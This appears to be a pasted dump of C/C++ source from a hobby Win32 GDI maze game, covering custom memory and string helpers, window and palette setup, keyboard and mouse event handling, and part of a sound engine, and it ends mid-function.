void* memSet(void* dst, int val, size_t len){
  if(!len) return dst;

  u8* dst8 = (u8*)dst;
  u8  val8 = (u8 )val;


  size_t remainder = len%sizeof(u32);
  len -= remainder;

  while((remainder--) > 0)
    *(dst8++) = val8;


  u32* dst32 = (u32*)dst8;
  u32  val32 = val8;

  val32 |= val32<< 8;
  val32 |= val32<<16;

  len /= sizeof(u32);

  while((len--) > 0)
    *(dst32++) = val32;


  return dst;

}



void* memCpy(void* dst, const void* src, size_t len){
  if(!len) return dst;

  u8* dst8 = (u8*)dst;
  u8* src8 = (u8*)src;

  while(len--) *(dst8++) = *(src8++);

  return dst;

}





//  (len_max does not include null-terminator!)
//  (If !len_max, call is analogous to str(not n)len)
size_t strnLen(const char* str, size_t len_max){
  size_t len = 0;

  if(!len_max){
    for(; str[len]; ++len);

  } else {
    for(; str[len] && len<len_max; ++len);

  }

  return len;

}



char* strnCpy(char* str_dst, const char* str_src, size_t len_max){
  char* _str_dst = str_dst; // Copy original state of str_dst

  if(!len_max){
    while((*str_dst++ = *str_src++));

  } else {
    size_t i = 0;
    while(i++ != len_max && (*str_dst++ = *str_src++));

  }


  *str_dst = 0; // Null-terminator

  return _str_dst;

}



char* strCat(char* dst, const char* src){
  char* dst_start = dst;

  while(*dst) ++dst;
  while((*dst++ = *src++));

  return dst_start;

}



// (len_max does not include null-terminator!)
// (If !len_max, call is analogous to str(not n)cmp)
s32 strnCmp(const char* str_a, const char* str_b, size_t len_max){
  if(!len_max){
    while(*str_a && (*str_a == *str_b))
      ++str_a, ++str_b;

  } else {
    --len_max;
    while(*str_a && (*str_a == *str_b) && len_max)
      ++str_a, ++str_b, --len_max;

  }

  return (*(const u8*)str_a) - (*(const u8*)str_b);

}





#define sinf_bhaskara_fmod(_x, _y) (   (_x) - (  (s64)((_x)/(_y)) * (_y)  )   )

// Custom sinf implementation; a little under 2% error iirc
// (You could switch floats with doubles here, though the approximation's
// lack of precision prevents that switch from being all that useful.)
f32 sinF(f32 x){
  // Keep x within the domain of >=0  ->  <pi,
  // while preserving relevant info
  bool negative = x<0.0f;
  if(x < 0.0f) x = -x; //x = fabsf(x);
  x = sinf_bhaskara_fmod(x, M_2PIf); //x %= 2pi
  // 'If original value of x%(2pi) is between _ -> _, returned value will be _':
   //>-2pi -> <=-pi,  >=0
   //> -pi -> <=  0,  <=0
   //>=  0 -> <  pi,  >=0
   //>= pi -> < 2pi,  <=0
  negative ^= x>=M_PIf;
  if(x >= M_PIf) x -= M_PIf; //x %= pi

  // Uses Bhaskara I's sine approximation formula
  f32 result = 16.0f*x * (M_PIf-x);
  result /= 5.0f*M_PIf*M_PIf - result*0.25f;
  return (negative) ? -result : result;

}





#endif /* STDLIB_USED */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\video.cpp"":
#include ""_WindowProc.hpp""





// Header + 256 colors (AKA 8-bpp)
static u8         _canvas_info[sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD)*256];
static BITMAPINFO* canvas_info = (BITMAPINFO*)_canvas_info; // Lol
static HBITMAP     canvas;
static HDC         canvas_dc;

Color8*  pixels         = nullptr;
Color24* pixels_palette = (Color24*)canvas_info->bmiColors;



static const char win_class_name[] = ""Normal Resizable Window"";
static WNDCLASS   win_class = {0};
HWND              win;
bool              win_closed = false;
Point2d           win_size = {CANVAS_W*WINDOW_RESMUL, CANVAS_H*WINDOW_RESMUL};





// Canvas is 8-bpp at (by default) 256x144
static inline bool InitCanvas(){
  canvas_info->bmiHeader.biSize = sizeof(canvas_info->bmiHeader);

  canvas_info->bmiHeader.biWidth  = CANVAS_W;
  canvas_info->bmiHeader.biHeight = CANVAS_H;

  canvas_info->bmiHeader.biPlanes      = 1;
  canvas_info->bmiHeader.biBitCount    = 8; // 8-bpp
  canvas_info->bmiHeader.biCompression = BI_RGB;
  canvas_info->bmiHeader.biSizeImage   = 0; // Valid for uncompressed bitmaps

  canvas_info->bmiHeader.biXPelsPerMeter = 3780; // Approximately 96dpi
  canvas_info->bmiHeader.biYPelsPerMeter = 3780;

  canvas_info->bmiHeader.biClrUsed      = 0; // Maximum # of colors used (256)
  canvas_info->bmiHeader.biClrImportant = 0; // All colors are important



  // Generate 256-color palette
  for(int i=0; i<256; ++i){
    Color8 color = i; // Sets the "".v"" member to i

    #define conv_b(_c) ((_c)*85)
    #define conv_rg(_c) ((u8)( (255.0f*((f32)(_c)/7)) + 0.5f ))
    pixels_palette[i].b = conv_b(color.b);
    pixels_palette[i].g = conv_rg(color.g);
    pixels_palette[i].r = conv_rg(color.r);
    pixels_palette[i]._ = 0;

  }

  // Generate grayscale portion
  // (This does overwrite some colors, but it's worth it, trust :)
  for(int i=0; i<256; i+=16){
    pixels_palette[i].b = i;
    pixels_palette[i].g = i;
    pixels_palette[i].r = i;

  }



  canvas_dc = CreateCompatibleDC(nullptr);
  if(!canvas_dc) return false;



  canvas = CreateDIBSection(nullptr, canvas_info, DIB_RGB_COLORS,
                            (void**)&pixels, nullptr, 0);
  if(!canvas) return false;



  HGDIOBJ result = SelectObject(canvas_dc, canvas);

  return result != nullptr  &&  result != HGDI_ERROR;

}





LRESULT CALLBACK WindowProc(HWND, UINT, WPARAM, LPARAM); // Forward declaration

int WindowInit(HINSTANCE hThisInst){
  if(!InitCanvas()) return -1;

  win_class.style         = CS_DBLCLKS; // Allow double clicks
  win_class.lpfnWndProc   = WindowProc;
  win_class.hInstance     = hThisInst;
  win_class.hCursor       = LoadCursorA(nullptr, IDC_ARROW);
  win_class.lpszClassName = win_class_name;
  RegisterClassA(&win_class);

  win = CreateWindowExA(WS_EX_LEFT, win_class_name, WINDOW_NAME,
                        WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                        CW_USEDEFAULT, CW_USEDEFAULT, // X, Y
                        win_size.x, win_size.y, // W, H
                        nullptr, nullptr, hThisInst, nullptr);

  if(!win) return -2;

  return 0;

}





void WindowQuit(){} // TBD (actually it may not be necessary at all, but w/e)





void canvas_present(bool immediate){
  // Marks the canvas to be redrawn.
  // If this is not called, Win32 will assume no redraw
  // is being requested at all!
  InvalidateRect(win, nullptr, false);

  // Win32 technically will redraw it automatically when it needs to (assuming
  // InvalidateRect was called), but doing this will send a paint message
  // immediately.
  //
  // This is useful if you end up updating the canvas slightly
  // after it would've updated normally, potentially making it
  // look like a frame was skipped (because it was :)
  if(immediate) UpdateWindow(win);

}



// Yep, this is just a single memset that sets every byte to fill_color
void canvas_clear(Color8 fill_color){
  memSet(&pixels[0].v, fill_color.v, CANVAS_W*CANVAS_H);

}



void close_window(){
  if(win_closed) return;

  DeleteObject(canvas);
  DeleteDC(canvas_dc);
  DestroyWindow(win);
  // These might not be necessary, due to the way uninitialization is set up
  //UnregisterClassA
  //DeleteCriticalSection

  win_closed = true;

}



#ifndef   INT_MAX
#define   INT_MAX 2147483647
#endif /* INT_MAX */

bool update_palette(u32 first_color, u32 num_colors,
                    const Color24* new_palette)
{
  // Return early if any of the parameters are out of range
  if(new_palette == nullptr) return false;
  if(first_color >  INT_MAX) return false;
  if(num_colors  >  INT_MAX) return false;


  first_color = MIN(first_color, 255);
  num_colors  = MIN(num_colors , 256);

  if((first_color+num_colors) > 256)
    num_colors = 256-first_color;


  bool success = SetDIBColorTable(canvas_dc, first_color, num_colors,
                                  (const RGBQUAD*)new_palette) != 0;

  return success;

}



Point2d get_win_size(){
  return win_size;

}





extern CRITICAL_SECTION events_lock;
extern Event            events_queue[65536];
extern u16              events_next;
extern u16              events_end;

extern Event_Key_Mod key_mods;
extern bool          key_states[256];

extern Point2d mouse_position;
extern bool    mouse_was_moved_before;

extern bool cursor_trapped;
extern bool cursor_hidden;

static union {
  RECT v;
  struct { POINT topLeft, bottomRight; };
} clipRect;

#include <hidusage.h>

static RAWINPUTDEVICE rid = {
  .usUsagePage = HID_USAGE_PAGE_GENERIC,  // Generic desktop controls
  .usUsage     = HID_USAGE_GENERIC_MOUSE, // Mouse
//.dwFlags     = RIDEV_NOLEGACY,
  .hwndTarget  = nullptr,
};

MOUSE_ButtonStates mbutton_states; // Persistent mouse state





static void update_cursor_clip(){
  LPRECT clipRect_p = nullptr;

  if(cursor_trapped){
    clipRect_p = &clipRect.v;
    GetClientRect(win, clipRect_p);
    ClientToScreen(win, &clipRect.topLeft);
    ClientToScreen(win, &clipRect.bottomRight);

  }

  ClipCursor(clipRect_p);

}





static void trap_cursor(bool enable, bool condition){
  if(!condition) return;

  if(enable != cursor_hidden){
    cursor_hidden = enable;
    ShowCursor(!enable); // Enabling makes it hidden, hence the '!'
  }

  if(enable != cursor_trapped){
    cursor_trapped = enable;
    update_cursor_clip();

    if(enable) SetCapture(win);
    else       ReleaseCapture();

    if(enable  &&  rid.hwndTarget == nullptr){
      rid.dwFlags    = RIDEV_NOLEGACY;
      rid.hwndTarget = win;
      if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))){
        _printf(""ERROR: failed to register mouse as a raw input device! ""
                ""(error code = 0x%08X)\n"", (u32)GetLastError());
        rid.hwndTarget = nullptr;
      }
    }
    else if(!enable  &&  rid.hwndTarget != nullptr){
      HWND hwndOld = rid.hwndTarget;
      rid.dwFlags    = RIDEV_REMOVE;
      rid.hwndTarget = nullptr;
      if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))){
        _printf(""ERROR: failed to unregister mouse as a raw input device! ""
                ""(error code = 0x%08X)\n"", (u32)GetLastError());
        rid.hwndTarget = hwndOld;
      }
    }

    Event evt;
    memSet(&evt, 0, sizeof(Event));
    evt.type = (enable) ? EVENT_CURSOR_TRAPPED : EVENT_CURSOR_RELEASED;
    AddToEventQueue(evt);

  }

}





static void add_event(Event& evt){
  // I pray AddToEventQueue never fails ever
  if(!AddToEventQueue(evt)){ _printf(""ERROR: EVENT QUEUE IS FULL!!!\n""); }

}





// flag_which must be one of the ""DOWN"" flags (Ex.: RI_MOUSE_BUTTON_1_DOWN)
// (Also, timestamp is assumed to have already been set inside evt!)
static void send_raw_mbutton_press(Event& evt, u16 flags,
                                   u16 flag_which, u8 button_which)
{
  if(flags&flag_which){ // Mouse down
    evt.type=EVENT_MOUSE_DOWN;
    evt.mouse.pressed = true;

    u8 button_old = evt.mouse.button;
    evt.mouse.button = button_which;

    add_event(evt);
    evt.mouse.button = button_old|button_which;
    mbutton_states.value |= button_which;

  }

  if(flags&(flag_which<<1)){ // Mouse up
    evt.type=EVENT_MOUSE_UP;
    evt.mouse.pressed = false;

    u8 button_old = evt.mouse.button;
    evt.mouse.button = button_which;

    add_event(evt);
    evt.mouse.button = button_old&(~button_which);
    mbutton_states.value &= ~button_which;

  }

}





LRESULT CALLBACK WindowProc(HWND winHandle, UINT message,
                            WPARAM wParam, LPARAM lParam)
{
  LRESULT returnResult = 0;

  Event evt; // Will be populated by any call to HANDLE_EVENT_<?>()...
  memSet(&evt, 0, sizeof(Event)); //(this is done BEFORE setting anything)
  evt.type = EVENT_COMMON; //...otherwise it will stay common

  bool switchBool  = false; // Multipurpose
  bool switchBool2 = true;  // ^^(switchBool2 intentionally initialized to true)
  u32  switchFlags = 0;     // ^^

  bool addEvent = true;



  switch(message){
    case WM_DESTROY:
      PostQuitMessage(0);
    case WM_QUIT:
    {
      evt.type = EVENT_QUIT;
      win_closed = true;
      trap_cursor(false, true);
    } break;



    case WM_GETMINMAXINFO: // For enforcing a minimum window size
    {
      u32 winStyleCurrent   = GetWindowLongA(winHandle, GWL_STYLE  );
      u32 winStyleExCurrent = GetWindowLongA(winHandle, GWL_EXSTYLE);

      Point2d winSizeAdjusted = CalculateWindowSize(CANVAS_W, CANVAS_H,
                                                    winStyleCurrent,
                                                    winStyleExCurrent);

      // Set the MINMAXINFO struct provided by lParam
      MINMAXINFO* mmi = (MINMAXINFO*)lParam;
      mmi->ptMinTrackSize.x = winSizeAdjusted.x;
      mmi->ptMinTrackSize.y = winSizeAdjusted.y;

    } break;



    case WM_SIZE: // Also redraw canvas if window is being resized
      win_size.x = LOWORD(lParam);
      win_size.y = HIWORD(lParam);
      update_cursor_clip();
    case WM_PAINT:
    {
      // Prepare window for painting
      PAINTSTRUCT paint;
      HDC winDevCtx = BeginPaint(winHandle, &paint); // Window device context
      Rect2d rectW = ConvertToKitRect(paint.rcPaint); // Window's rect

      // Copy canvas bitmap to window
      SetStretchBltMode(winDevCtx, COLORONCOLOR); // Nearest-neighbor
      StretchBlt(winDevCtx, rectW.x,rectW.y,  rectW.w,  rectW.h,
                 canvas_dc,       0,      0, CANVAS_W, CANVAS_H, SRCCOPY);

      if(message == WM_SIZE)
        canvas_present(true);

      EndPaint(winHandle, &paint);

    } break;



    case WM_KILLFOCUS:
    {
      // If a key is released outside the client area, its key up message
      // is never sent, so here the key states are reset when unfocusing...
      // ...but first, send a key up event for every currently pressed key

      // Call QPC only once, since the events technically happen simultaneously
      QueryPerformanceCounter((LARGE_INTEGER*)&evt.key.timestamp);

      KEY_Params params = 0;
      params.currUnpressed = 1;

      for(u32 chr=0; chr<256; ++chr){
        // Send a KEY_UP only if the state was previously true
        if(key_states[chr] == true){
          params.scanCode = MapVirtualKeyA(chr, MAPVK_VK_TO_VSC);
          HANDLE_KEY_CHARUPDOWN(evt, false, chr, params, 0);
          add_event(evt);
        }
      }

      memSet(key_states, 0, sizeof(bool)*256); //NOW the states can be reset

      // Reset all key modifiers (except for toggles) too
      key_mods.all &= 0xff00; // Non-toggles are stored in low byte

      mbutton_states.value = 0; // Reset mouse states as well

      trap_cursor(false, true);

    } break;



    //EVENT_KEY_CHAR, EVENT_KEY_UP, EVENT_KEY_DOWN
    case WM_CHAR:
    case WM_SYSKEYUP:
    case WM_SYSKEYDOWN:
    case WM_KEYUP:
    case WM_KEYDOWN:
    case WM_SYSCHAR:
    {
      // Marshal relevant stuff to pass to event handler
      bool    charEvent = message==WM_CHAR;
      u8 virtualKeyCode = (u8) wParam;
      KEY_Params params = (u32)lParam;

      // Set repeat flag
      params.repeatCount = (!params.currUnpressed)    == true &&
                           key_states[virtualKeyCode] == true;

      if(!charEvent){
        // (Uncomment the last part of the line below if issues occur
        //  related to missed key press events or something!)
        bool keydown = message==WM_KEYDOWN;//|| message==WM_SYSKEYDOWN;
        bool pressed = !params.currUnpressed;
        key_states[virtualKeyCode] = pressed;

        // Update any relevant key modifiers
        switch(virtualKeyCode){
          case VKEY_SHIFT    : { key_mods.lshift = key_mods.rshift = pressed; } break;
          case VKEY_CONTROL  : { key_mods.lctrl  = key_mods.rctrl  = pressed; } break;
          case VKEY_ALT      : { key_mods.lalt   = key_mods.ralt   = pressed; } break;
          case VKEY_LWIN     : { key_mods.lgui   = pressed; } break;
          case VKEY_RWIN     : { key_mods.rgui   = pressed; } break;
          case VKEY_NUMLOCK  : if(keydown){ key_mods.numlock^=1; } break;
          case VKEY_CAPSLOCK : if(keydown){ key_mods.capslock^=1; } break;
          case VKEY_SCROLLOCK: if(keydown){ key_mods.scrollock^=1; } break;
          default:;
        }

        if(     virtualKeyCode==VKEY_CTRL ) mbutton_states.ctrl  = pressed;
        else if(virtualKeyCode==VKEY_SHIFT) mbutton_states.shift = pressed;

        bool repeat = params.repeatCount!=0;
        trap_cursor(!cursor_trapped,
                    virtualKeyCode==VKEY_ESCAPE && keydown && !repeat);

      }

      HANDLE_KEY_CHARUPDOWN(evt, charEvent, virtualKeyCode,
                                    params,   key_mods.all);

    } break;



    //EVENT_MOUSE_MOVED
    case WM_MOUSEMOVE:
    {
      // Get button states
      MOUSE_ButtonStates buttonStates;
      buttonStates.left   = (wParam&MK_LBUTTON ) != 0;
      buttonStates.middle = (wParam&MK_MBUTTON ) != 0;
      buttonStates.right  = (wParam&MK_RBUTTON ) != 0;
      buttonStates.x1     = (wParam&MK_XBUTTON1) != 0;
      buttonStates.x2     = (wParam&MK_XBUTTON2) != 0;
      buttonStates.ctrl   = (wParam&MK_CONTROL ) != 0;
      buttonStates.shift  = (wParam&MK_SHIFT   ) != 0;

      // Get new mouse position
      Point2d mousePositionNew;
      mousePositionNew.x =                GET_X_LPARAM(lParam);
      mousePositionNew.y = win_size.y-1 - GET_Y_LPARAM(lParam);

      // If this is the first instance of WINEVENT_MOUSE_MOVE,
      // there is no previous mouse position, so the delta should be 0 then
      if(!mouse_was_moved_before){
        mouse_position = mousePositionNew;
        mouse_was_moved_before = true;
      }

      HANDLE_MOUSE_MOVED(evt, buttonStates.value,
                         mouse_position, mousePositionNew);

      mouse_position = mousePositionNew; // Set current position to new one

    } break;



    case WM_MOUSELEAVE:
    {
      // Indicates that the mouse will have yet to be moved inside client area
      mouse_was_moved_before = false;
    } break;



    //EVENT_MOUSE_HWHEEL, EVENT_MOUSE_VWHEEL
    case WM_MOUSEHWHEEL:
    case WM_MOUSEWHEEL:
    {
      bool verticalScroll = message==WM_MOUSEWHEEL;

      s16 scrollAmount = (s16)HIWORD(wParam);

      mbutton_states.left   = (wParam&MK_LBUTTON ) != 0;
      mbutton_states.middle = (wParam&MK_MBUTTON ) != 0;
      mbutton_states.right  = (wParam&MK_RBUTTON ) != 0;
      mbutton_states.x1     = (wParam&MK_XBUTTON1) != 0;
      mbutton_states.x2     = (wParam&MK_XBUTTON2) != 0;

      Point2d scrollMousePosition;
      scrollMousePosition.x = GET_X_LPARAM(lParam);
      scrollMousePosition.y = GET_Y_LPARAM(lParam);

      // The coordinates are, by default, relative to the screen
      // and not the window (for some reason)
      ScreenToClient(winHandle, (POINT*)&scrollMousePosition);

      HANDLE_MOUSE_HVWHEEL(evt, verticalScroll, scrollAmount,
                           mbutton_states.value, scrollMousePosition);

    } break;



    //EVENT_MOUSE_UP, EVENT_MOUSE_DOWN
     //switchBool  = evt.mouse.dblClick
     //switchBool2 = evt.mouse.pressed
     //switchFlags = evt.mouse.button
    case WM_LBUTTONDBLCLK: switchBool  = true;  goto _notLButtonUp;
    case WM_LBUTTONUP    : switchBool2 = false; _notLButtonUp:
    case WM_LBUTTONDOWN  : switchFlags |= MBUTTON_LEFT; goto _handleMouseClick;

    case WM_MBUTTONDBLCLK: switchBool  = true;  goto _notMButtonUp;
    case WM_MBUTTONUP    : switchBool2 = false; _notMButtonUp:
    case WM_MBUTTONDOWN  : switchFlags |=MBUTTON_MIDDLE; goto _handleMouseClick;

    case WM_RBUTTONDBLCLK: switchBool  = true;  goto _notRButtonUp;
    case WM_RBUTTONUP    : switchBool2 = false; _notRButtonUp:
    case WM_RBUTTONDOWN  : switchFlags |= MBUTTON_RIGHT; goto _handleMouseClick;

    case WM_XBUTTONDBLCLK: switchBool  = true;  goto _notXButtonUp;
    case WM_XBUTTONUP    : switchBool2 = false; _notXButtonUp:
    case WM_XBUTTONDOWN  : if(wParam & MK_XBUTTON1) switchFlags |= MBUTTON_X1;
                           else                     switchFlags |= MBUTTON_X2;
    {
      _handleMouseClick:

      Point2d clickPosition;
      clickPosition.x = GET_X_LPARAM(lParam);
      clickPosition.y = GET_Y_LPARAM(lParam);

      bool pressed      = switchBool2;
      bool doubleClick  = switchBool;

           if(switchFlags&MBUTTON_LEFT  ) mbutton_states.left   = pressed;
      else if(switchFlags&MBUTTON_MIDDLE) mbutton_states.middle = pressed;
      else if(switchFlags&MBUTTON_RIGHT ) mbutton_states.right  = pressed;
      else if(switchFlags&MBUTTON_X1    ) mbutton_states.x1     = pressed;
      else if(switchFlags&MBUTTON_X2    ) mbutton_states.x2     = pressed;

      HANDLE_MOUSE_UPDOWN(evt, clickPosition,
                          mbutton_states.value, pressed, doubleClick);

    } break;



    case WM_INPUT:
    {
      // First call to query for the data's size
      UINT dataSize = 0;
      GetRawInputData((HRAWINPUT)lParam, RID_INPUT, nullptr,
                      &dataSize, sizeof(RAWINPUTHEADER));
      RAWINPUT* data = (RAWINPUT*)alloca(dataSize);

      // Second call to get the actual data
      if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, data,
                         &dataSize, sizeof(RAWINPUTHEADER)) == dataSize)
      {
        const RAWMOUSE& mouse = data->data.mouse;

        if(data->header.dwType != RIM_TYPEMOUSE  ||
           mouse.usFlags != MOUSE_MOVE_RELATIVE)
        {
          addEvent = false; break;
        }

        // Handle the actual event stuff
        {
          s32 _deltaWheel = mouse.usButtonData;
          if(_deltaWheel >= 32768) _deltaWheel -= 65536; // Unsigned-to-signed

          const u16 flags      = mouse.usButtonFlags;
          const f32 deltaWheel = (f32)_deltaWheel/WHEEL_DELTA;
          const f32 deltaX     =  mouse.lLastX;
          const f32 deltaY     = -mouse.lLastY; // GDI's bitmaps are *bottom-up*

          HANDLE_MOUSE_RAWINPUT(evt, flags, deltaWheel, deltaX, deltaY);
        }

      } else {
        _printf(""ERROR: failed to get raw mouse input data! ""
                ""(error code = 0x%08X)\n"", (u32)GetLastError());

      }

      // Any relevant raw input events will already have been sent by this point
      addEvent = false;

    } break;



    default: returnResult = DefWindowProcA(winHandle, message, wParam, lParam);

  }



  if(evt.type != EVENT_COMMON  &&  evt.common.timestamp == 0  &&  addEvent)
  {
    // Idk how expensive QPC is, so I'll only call it if the event is valid
    QueryPerformanceCounter((LARGE_INTEGER*)&evt.common.timestamp);
    add_event(evt);
  }



  return returnResult;

}
"
sjz11Ldg,work for 2025-04-25 (2/5),Kitomas,C++,Friday 25th of April 2025 05:00:31 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\sound\SoundEngine.cpp"":
// DO NOT USE THIS AS REFERENCE FOR A NEW PROJECT
// THIS IS A HACKY PORT OF KIT_SDL2'S SOUNDENGINE!!!!
#include <public_stuff.hpp>

#ifdef SOUND_STUFF_USED

#include <windows.h>





#define SNDENGINE_IS_INVALID (_tracks_len == 0)
#define SNDENGINE_IS_TRACK_OOB (track >= _tracks_len)



#define MUTEX_PTR ((CRITICAL_SECTION*)&_lock)

#define LOCK_MUTEX \
  bool locked = false; \
  if(MUTEX_PTR != nullptr){ EnterCriticalSection(MUTEX_PTR); locked = true; }

#define UNLOCK_MUTEX                      { \
  if(locked){ LeaveCriticalSection(MUTEX_PTR); locked = false; } }





SoundEngine::SoundEngine(u16 numTracks, f32 _sampleRate){
  if(numTracks < 1) return;

  _tracks_len = numTracks;

  mem_set(_tracks, 0, sizeof(SoundEngineTrack)*_tracks_len);

  InitializeCriticalSectionAndSpinCount(MUTEX_PTR, 4096);

  sampleRate = _sampleRate;

}





SoundEngine::~SoundEngine(){
  if(_tracks_len == 0) return;

  LOCK_MUTEX;

  for(u16 t=0; t<_tracks_len; ++t)
    _tracks[t].audio = nullptr;

  _tracks_len = 0;

  UNLOCK_MUTEX;

  DeleteCriticalSection(MUTEX_PTR);

}





bool SoundEngine::isTrackPlaying(u16 track){
  if(SNDENGINE_IS_INVALID  ) return false;
  if(SNDENGINE_IS_TRACK_OOB) return false;

  return _tracks[track].audio != nullptr;

}





u16 SoundEngine::getActiveTracks(){
  if(SNDENGINE_IS_INVALID) return 0;

  u16 activeTracks = 0;

  SoundEngineTrack* tracks = _tracks;

  LOCK_MUTEX;

  for(u16 t=0; t<_tracks_len; ++t){
    if(tracks[t].audio != nullptr) ++activeTracks;
  }

  UNLOCK_MUTEX;

  return activeTracks;

}





bool SoundEngine::setVolume(f32 volumeL, f32 volumeR,
                            u16 track, bool forced)
{
  if(SNDENGINE_IS_INVALID) return false;

  // Normally, anything at or below 0 will cause the clip
  // to stop immediately, but this check couldn't hurt
  StereoF32 volumeNew = { MAX(volumeL, 0.0f), MAX(volumeR, 0.0f) };



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;

    SoundEngineTrack& _track = _tracks[track];
    if(_track.audio == nullptr) return true; // Track is empty; exit early

    LOCK_MUTEX;

    if(forced) _track.vol_old = volumeNew;
    _track.vol_new = volumeNew;

    UNLOCK_MUTEX;



  } else {
    SoundEngineTrack* tracks = _tracks;

    LOCK_MUTEX;

    if(!forced){
      for(u16 t=0; t<_tracks_len; ++t)
        tracks[t].vol_new = volumeNew;

    } else {
      for(u16 t=0; t<_tracks_len; ++t){
        tracks[t].vol_old = volumeNew;
        tracks[t].vol_new = volumeNew;
      }

    }

    UNLOCK_MUTEX;



  }



  return true;

}





// Used to modify speed values to account for different sample rates
//
// (Volume doesn't need this modifier, since it operates
//  on the destination buffer, NOT the source buffer!)
#define SMPRATE_MOD_RAW(_src_samplerate) \
  (  (f64)(_src_samplerate)/sampleRate  )

// (This one assumes .audio != nullptr, so just be aware of that)
#define SMPRATE_MOD(_track_lvalue) \
  SMPRATE_MOD_RAW(_track_lvalue.audio->sampleRate)

bool SoundEngine::setSpeed(f64 speedNew,
                           u16 track, bool forced)
{
  if(SNDENGINE_IS_INVALID) return false;

  // Normally, anything at or below 0 will cause the clip
  // to stop immediately, but this check couldn't hurt
  if(speedNew < 0.0) speedNew = 0.0;



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;

    SoundEngineTrack& _track = _tracks[track];
    if(_track.audio == nullptr) return true; // Track is empty; exit early

    LOCK_MUTEX;

    speedNew *= SMPRATE_MOD(_track);

    if(forced) _track.spd_old = speedNew;
    _track.spd_new = speedNew;

    UNLOCK_MUTEX;



  } else {
    SoundEngineTrack* tracks = _tracks;

    LOCK_MUTEX;

    if(!forced){
      for(u16 t=0; t<_tracks_len; ++t){
        if(tracks[t].audio == nullptr) continue; // Track is empty; skip
        tracks[t].spd_new = speedNew*SMPRATE_MOD(tracks[t]);
      }

    } else {
      for(u16 t=0; t<_tracks_len; ++t){
        if(tracks[t].audio == nullptr) continue; // Track is empty; skip
        f64 _speedNew = speedNew*SMPRATE_MOD(tracks[t]);
        tracks[t].spd_old = _speedNew;
        tracks[t].spd_new = _speedNew;
      }

    }

    UNLOCK_MUTEX;



  }



  return true;

}





bool SoundEngine::setVolumeDelta(f32 deltaSecondsL, f32 deltaSecondsR,
                                 u16 track)
{
  if(SNDENGINE_IS_INVALID) return false;

  // Calculate delta, with a divide-by zero check
  StereoF32 delta = { 0.0f, 0.0f };

  if(sampleRate){
    if(deltaSecondsL) delta.l = (1.0f/deltaSecondsL) / sampleRate;
    if(deltaSecondsR) delta.r = (1.0f/deltaSecondsR) / sampleRate;
  }



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;
    _tracks[track].volDelta = delta;

  } else {
    SoundEngineTrack* tracks = _tracks;
    for(u16 t=0; t<_tracks_len; ++t)
      tracks[t].volDelta = delta;

  }

  return true;

}





bool SoundEngine::setSpeedDelta(f64 deltaSeconds,
                                u16 track)
{
  if(SNDENGINE_IS_INVALID) return false;

  // Calculate delta, with a divide-by zero check
  f64 delta = (deltaSeconds != 0)  ?  ((1.0/deltaSeconds) / sampleRate)  :  0.0;



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;

    SoundEngineTrack& _track = _tracks[track];
    if(_track.audio == nullptr) return true; // Track is empty; skip

    _track.spdDelta = delta*SMPRATE_MOD(_track);


  } else {
    SoundEngineTrack* tracks = _tracks;

    for(u16 t=0; t<_tracks_len; ++t){
      if(tracks[t].audio == nullptr) continue; // Track is empty; skip
      tracks[t].spdDelta = delta*SMPRATE_MOD(tracks[t]);

    }


  }

  return true;

}





#define PLAY_ASSERT(_success, _err_msg) \
  if(!(_success)){ _printf(""ERROR: %s\n"", _err_msg); return 0xFFFE; }

u16 SoundEngine::play(const AudioData& audio,
                      f32 volumeL, f32 volumeR, f64 speed)
{
  if(SNDENGINE_IS_INVALID) return 0xFFFE;

  PLAY_ASSERT(audio.hdr, ""audio.hdr = nullptr"");
  PLAY_ASSERT(audio.hdr->format == SMPFMT_F32, ""audio.hdr->format != SMPFMT_F32"");
  PLAY_ASSERT(audio.hdr->channels == 1  ||  audio.hdr->channels == 2,
              ""audio.hdr->channels is neither mono nor stereo"")


  f64 timestamp = timeGetSeconds();


  // Will remain and return as 0xFFFF if no available track was found
  u16 queuedTrackNum = 0xFFFF;

  SoundEngineTrack* tracks = _tracks;



  // (Is locking actually necessary here?)
  LOCK_MUTEX; // TBD: If timing problems start to occur, remove the lock

  for(u16 t=0; t<_tracks_len; ++t){
    SoundEngineTrack& track = tracks[t];


    if(track.audio == nullptr){
      track.timestamp = timestamp;

    //track.position  = <set inside callback>;

      track.spd_old   = MAX(speed*SMPRATE_MOD_RAW(audio.hdr->sampleRate), 0.0);
      track.spd_new   = track.spd_old;
      track.spdDelta  = 0.0;

      track.vol_old   = {volumeL, volumeR};
      track.vol_new   = {volumeL, volumeR};
      track.volDelta  = {   0.0f,    0.0f};
      track.volMaster = audio.volume;

      track.loops     = audio.hdr->loopCount;
      track.stopping  = false;

      //set last to make sure that all relevant members
       //of the track are set before beginning
      track.audio     = audio.hdr;

      queuedTrackNum = t; break;

    }

  }

  UNLOCK_MUTEX;

  return queuedTrackNum;

}





bool SoundEngine::stop(u16 track, bool forced){
  if(SNDENGINE_IS_INVALID) return false;

  // If !forced, 'stop' the track by setting a fade-out of 10ms,
  // whereupon the track will *actually* stop automatically
  f32 _fadeoutDelta = (1.0f/-0.010f) / sampleRate;
  StereoF32 fadeoutDelta = {_fadeoutDelta, _fadeoutDelta};



  if(track != 0xFFFF){
    if(SNDENGINE_IS_TRACK_OOB) return false;

    SoundEngineTrack& _track = _tracks[track];
    if(_track.audio == nullptr) return true; // Track is empty; skip

    if(!forced) _track.volDelta = fadeoutDelta;
    else        _track.audio    = nullptr;



  } else {
    SoundEngineTrack* tracks = _tracks;

    if(!forced){
      for(u16 t=0; t<_tracks_len; ++t)
        tracks[t].volDelta = fadeoutDelta;

    } else {
      for(u16 t=0; t<_tracks_len; ++t)
        tracks[t].audio = nullptr;

    }



  }



  return true;

}





// Returns false if timeout is reached, true otherwise
static inline bool _waitForTrack(const AudioDataHeader*& audio,
